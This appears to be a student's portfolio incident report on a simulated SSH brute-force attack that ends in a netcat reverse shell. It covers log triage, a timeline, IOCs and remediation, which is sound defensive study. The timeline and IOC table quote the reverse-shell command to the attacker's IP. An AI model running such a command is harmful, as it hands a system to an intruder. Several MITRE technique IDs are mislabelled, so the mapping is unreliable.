# Unauthorized Remote Access & Reverse Shell — Incident Report  
**Author:** P. Guid  
**GitHub:** https://github.com/pguidry17  
**Project Type:** Guided Cybersecurity Portfolio Case Study  
**Platform:** Linux (Ubuntu)  
**Date of Analysis:** (Simulated Training Scenario)

---

## 1. Executive Summary

As part of my cybersecurity learning portfolio, I conducted a guided analysis of Linux authentication logs to investigate a simulated SSH brute-force attack leading to a full system compromise. The attacker, originating from 185.199.110.22, performed repeated failed login attempts until successfully authenticating as the `ubuntu` user. After gaining access, the attacker ran privileged commands, installed netcat, and established a reverse shell back to their own machine.

This project helped me practice SOC-style investigation steps including log triage, IOC extraction, understanding attacker behavior, mapping activity to MITRE ATT&CK, and writing a professional incident report.

---

## 2. Incident Overview

| Category | Details |
|---------|---------|
| Threat Type | SSH Brute Force → Unauthorized Login → Reverse Shell |
| Vector | External SSH access |
| Attacker IP | 185.199.110.22 |
| Compromised Account | ubuntu |
| Privilege Activity | Multiple sudo commands |
| Malicious Tooling | Netcat installed & used for C2 |
| Severity | High |

---

## 3. Evidence Source

Logs were taken from `/var/log/auth.log`.

Commands used during analysis:

grep "Failed password" auth.log
grep "Accepted" auth.log
grep "sudo:" auth.log
grep "185.199.110.22" auth.log

---

## 4. Attack Timeline

**03:11:22** — Multiple failed SSH login attempts from 185.199.110.22 using usernames: `admin`, `root`, `test`, `deploy`, `ubuntu`.

**03:13:42 – 03:14:14** — Repeated password failures targeting the `root` account.

**03:15:31** — Successful SSH login:

Accepted password for ubuntu using 185.199.110.22 port 50514


**03:15:41 – 03:16:29** — Attacker runs privileged commands with `sudo`:
- `/usr/bin/su`
- `cat /etc/passwd`
- `apt update`
- `apt install netcat`

**03:16:41** — Reverse shell created:

netcat 185.199.110.22 4444 -e/bin/bash

---

## 5. Indicators of Compromise (IOCs)

| IOC Type | Indicator | Description |
|----------|-----------|-------------|
| IP Address | 185.199.110.22 | Source of brute force & C2 |
| Malicious Command | netcat ... 4444 -e /bin/bash | Reverse shell |
| Tool Installation | apt install netcat | Netcat used for C2 |
| Auth Behavior | Multiple failed logins | Brute force attempt |

---

## 6. MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Initial Access | T1110 — Brute Force | Repeated SSH failures |
| Execution | T1059 — Command Shell | sudo + shell commands |
| Privilege Escalation | T1068 — Valid Accounts | Successful login |
| Discovery | T1087 — Account Discovery | cat /etc/passwd |
| Command & Control | T1056 — Reverse Shell | Netcat connection |

---

## 7. Impact Assessment

| Category | Level | Notes |
|----------|--------|-------|
| Confidentiality | High | Attacker gained shell access |
| Integrity | Medium | Commands executed, tools installed |
| Availability | Low | No disruption observed |
| **Overall Severity** | **High** | Full compromise |

---

## 8. Recommended Remediation

### Immediate
- Block attacker IP  
- Terminate SSH sessions  
- Rotate credentials  
- Disable password-based SSH login  

### Short-Term
- Enforce SSH keys  
- Restrict SSH to VPN/trusted IPs  
- Review `.ssh` for unauthorized keys  

### Long-Term
- Deploy SIEM  
- Install fail2ban  
- Conduct regular audits  

---

## 9. Lessons Learned

This case helped reinforce:

- Linux log analysis  
- Recognizing brute-force patterns  
- Detecting reverse shells  
- Timeline reconstruction  
- Professional reporting  
- MITRE ATT&CK mapping  

---
---

**End of Report**  
**Author:** P. Guid  
